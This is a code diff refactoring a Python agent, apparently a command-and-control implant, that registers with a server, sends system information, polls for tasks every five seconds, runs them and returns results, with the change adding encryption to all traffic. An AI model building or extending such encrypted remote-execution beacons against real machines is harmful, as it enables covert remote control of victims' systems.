@@ -21,6 +21,7 @@ else:
     sys.path.append(current_dir) # For 'executor'
 
 from shared.schemas import Task
+from shared.crypto import encrypt_payload, decrypt_payload
 
 from executor import Executor
 
@@ -38,61 +39,82 @@ def get_agent_id():
             f.write(new_id)
         return new_id
 
-AGENT_ID = get_agent_id()
+class DaliAgent:
+    def __init__(self):
+        self.agent_id = get_agent_id()
+        print(f"[*] Initializing agent with ID: {self.agent_id}")
 
-async def register():
-    # Gather system info for the dashboard
-    sys_info = Executor._get_sysinfo().get("info", {})
-    
-    async with httpx.AsyncClient() as client:
+    async def register(self):
+        print(f"[*] Registering agent: {self.agent_id}")
+        
+        # Gather initial info via sysinfo plugin
+        info = Executor._get_sysinfo()
+        
+        payload = {
+            "agent_id": self.agent_id,
+            "info": info,
+            "version": VERSION
+        }
+        
         try:
-            params = {
-                "agent_id": AGENT_ID,
-                "version": VERSION
-            }
-            response = await client.post(f"{SERVER_URL}/register", params=params, json=sys_info)
-            print(f"[*] Registration status: {response.json()}")
+            # Encrypt registration data
+            encrypted_data = encrypt_payload(payload)
+            async with httpx.AsyncClient() as client:
+                response = await client.post(
+                    f"{SERVER_URL}/register", 
+                    json={"data": encrypted_data}
+                )
+                if response.status_code == 200:
+                    # Decrypt server response if needed (though status is enough)
+                    resp_json = response.json()
+                    server_data = decrypt_payload(resp_json.get("data", ""))
+                    print(f"[+] Server response: {server_data.get('status')}")
+                else:
+                    print(f"[!] Registration failed: {response.status_code}")
         except Exception as e:
-            print(f"[!] Registration failed: {e}")
+            print(f"[!] Registration error: {e}")
 
-async def poll_tasks():
-    async with httpx.AsyncClient() as client:
+    async def poll_tasks(self):
         try:
-            response = await client.get(f"{SERVER_URL}/tasks/{AGENT_ID}")
-            if response.status_code == 200:
-                tasks = response.json()
-                for task_data in tasks:
-                    task = Task(**task_data)
-                    print(f"[*] Received task: {task.type}")
+            async with httpx.AsyncClient() as client:
+                response = await client.get(f"{SERVER_URL}/tasks/{self.agent_id}")
+                if response.status_code == 200:
+                    # Decrypt task list from server
+                    resp_json = response.json()
+                    server_data = decrypt_payload(resp_json.get("data", ""))
+                    tasks_data = server_data.get("tasks", [])
                     
-                    from executor import Executor
-                    result = Executor.execute(task.type, task.payload)
-                    
-                    await submit_result(task.id, result)
+                    for t_data in tasks_data:
+                        print(f"[*] Received task: {t_data.get('type')}")
+                        result = Executor.execute(t_data.get('type'), t_data.get('payload'))
+                        await self.submit_result(t_data.get('id'), result)
         except Exception as e:
-            print(f"[!] Task polling failed: {e}")
+            print(f"[!] Polling error: {e}")
 
-async def submit_result(task_id: str, result: dict):
-    async with httpx.AsyncClient() as client:
+    async def submit_result(self, task_id: str, result: dict):
+        payload = {
+            "task_id": task_id,
+            "result": result
+        }
         try:
-            response = await client.post(
-                f"{SERVER_URL}/tasks/{AGENT_ID}/results?task_id={task_id}",
-                json=result
-            )
-            print(f"[*] Result submitted: {response.json()}")
+            encrypted_data = encrypt_payload(payload)
+            async with httpx.AsyncClient() as client:
+                await client.post(
+                    f"{SERVER_URL}/tasks/{self.agent_id}/results", 
+                    json={"data": encrypted_data}
+                )
         except Exception as e:
-            print(f"[!] Result submission failed: {e}")
+            print(f"[!] Submit result error: {e}")
 
-async def main():
-    print(f"[*] Starting agent {AGENT_ID}")
-    await register()
-    
-    while True:
-        await poll_tasks()
-        await asyncio.sleep(10)
+    async def run(self):
+        await self.register()
+        while True:
+            await self.poll_tasks()
+            await asyncio.sleep(5)  # Poll every 5 seconds
 
 if __name__ == "__main__":
     try:
-        asyncio.run(main())
+        agent = DaliAgent()
+        asyncio.run(agent.run())
     except KeyboardInterrupt:
         print("\n[*] Agent stopped")
